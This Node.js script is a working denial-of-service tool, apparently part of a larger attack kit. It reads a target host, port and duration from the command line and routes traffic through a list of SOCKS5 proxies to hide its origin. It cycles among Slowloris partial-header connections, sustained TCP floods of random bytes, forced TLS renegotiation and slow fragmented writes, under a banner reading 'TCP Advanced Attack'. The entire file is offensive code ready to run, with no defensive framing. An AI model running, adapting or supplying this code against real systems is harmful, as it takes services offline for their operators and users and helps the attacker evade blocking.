const net = require('net');
const tls = require('tls');
const crypto = require('crypto');
const SocksClient = require('socks').SocksClient;
const fs = require('fs');

const target = process.argv[2];
const port = process.argv[3];
const duration = process.argv[4];

// Load SOCKS5 proxies
let proxies = [];
try {
    const proxyData = fs.readFileSync('socks5.txt', 'utf8');
    proxies = proxyData.split('\n').filter(line => line.trim() !== '');
} catch (err) {
    console.log('Error loading proxies, fetching from remote...');
    // Will be fetched by bootup function in index.js
}

function getRandomProxy() {
    return proxies[Math.floor(Math.random() * proxies.length)];
}

// Generate random data
function generatePayload(size) {
    return crypto.randomBytes(size);
}

// Different payload sizes
const payloads = {
    small: generatePayload(64),
    medium: generatePayload(512),
    large: generatePayload(1024),
    huge: generatePayload(2048)
};

async function createProxiedConnection(proxyString) {
    const [proxyHost, proxyPort] = proxyString.split(':');
    
    const options = {
        proxy: {
            host: proxyHost,
            port: parseInt(proxyPort),
            type: 5 // SOCKS5
        },
        command: 'connect',
        destination: {
            host: target,
            port: parseInt(port)
        }
    };

    try {
        const info = await SocksClient.createConnection(options);
        return info.socket;
    } catch (err) {
        return null;
    }
}

// TCP Advanced Attack Methods with proxies
async function slowlorisAttack() {
    const connections = [];
    const maxConnections = 150;
    const proxy = getRandomProxy();

    for(let i = 0; i < maxConnections; i++) {
        try {
            const socket = await createProxiedConnection(proxy);
            if (!socket) continue;

            // Send partial HTTP request
            socket.write(
                'GET / HTTP/1.1\r\n' +
                'Host: ' + target + '\r\n' +
                'User-Agent: Mozilla/5.0\r\n'
            );

            // Keep connection alive by sending partial headers
            const interval = setInterval(() => {
                socket.write('X-a: ' + Math.random() + '\r\n');
            }, 15000);

            socket.on('error', () => {
                clearInterval(interval);
                socket.destroy();
            });

            connections.push(socket);
        } catch (err) {
            continue;
        }
    }

    // Cleanup after some time
    setTimeout(() => {
        connections.forEach(socket => socket.destroy());
    }, 30000);
}

async function tcpPersistentAttack() {
    const proxy = getRandomProxy();
    
    for(let i = 0; i < 100; i++) {
        try {
            const socket = await createProxiedConnection(proxy);
            if (!socket) continue;

            // Keep sending data
            const interval = setInterval(() => {
                socket.write(payloads.medium);
            }, 100);

            socket.on('error', () => {
                clearInterval(interval);
                socket.destroy();
            });

            // Cleanup after some time
            setTimeout(() => {
                clearInterval(interval);
                socket.destroy();
            }, 20000);
        } catch (err) {
            continue;
        }
    }
}

async function tlsRenegotiationAttack() {
    const proxy = getRandomProxy();
    const options = {
        rejectUnauthorized: false,
        requestCert: true
    };

    for(let i = 0; i < 50; i++) {
        try {
            const rawSocket = await createProxiedConnection(proxy);
            if (!rawSocket) continue;

            const socket = tls.connect({
                ...options,
                socket: rawSocket
            });

            // Force TLS renegotiation
            const interval = setInterval(() => {
                socket.renegotiate({}, () => {});
            }, 200);

            socket.on('error', () => {
                clearInterval(interval);
                socket.destroy();
            });

            // Cleanup after some time
            setTimeout(() => {
                clearInterval(interval);
                socket.destroy();
            }, 15000);
        } catch (err) {
            continue;
        }
    }
}

async function tcpFragmentationAttack() {
    const proxy = getRandomProxy();
    
    for(let i = 0; i < 80; i++) {
        try {
            const socket = await createProxiedConnection(proxy);
            if (!socket) continue;

            // Send fragmented data
            const data = payloads.large;
            const chunkSize = 16;
            
            for(let j = 0; j < data.length; j += chunkSize) {
                const chunk = data.slice(j, j + chunkSize);
                setTimeout(() => {
                    socket.write(chunk);
                }, j * 10);
            }

            socket.on('error', () => {
                socket.destroy();
            });

            // Cleanup after some time
            setTimeout(() => {
                socket.destroy();
            }, 25000);
        } catch (err) {
            continue;
        }
    }
}

// Main attack loop
setInterval(async () => {
    // Randomly choose attack method
    const attackMethod = Math.floor(Math.random() * 4);
    
    switch(attackMethod) {
        case 0:
            await slowlorisAttack();
            break;
        case 1:
            await tcpPersistentAttack();
            break;
        case 2:
            await tlsRenegotiationAttack();
            break;
        case 3:
            await tcpFragmentationAttack();
            break;
    }
}, 1000);

console.clear();
console.log(`
╔══════════════════════════════════════════╗
║          TCP Advanced Attack             ║
║------------------------------------------║
║ Target: ${target}
║ Port: ${port}
║ Duration: ${duration} seconds
║ Status: Running with SOCKS5 Proxies...
╚══════════════════════════════════════════╝
`);

setTimeout(() => {
    console.log('Attack completed.');
    process.exit(0);
}, duration * 1000); 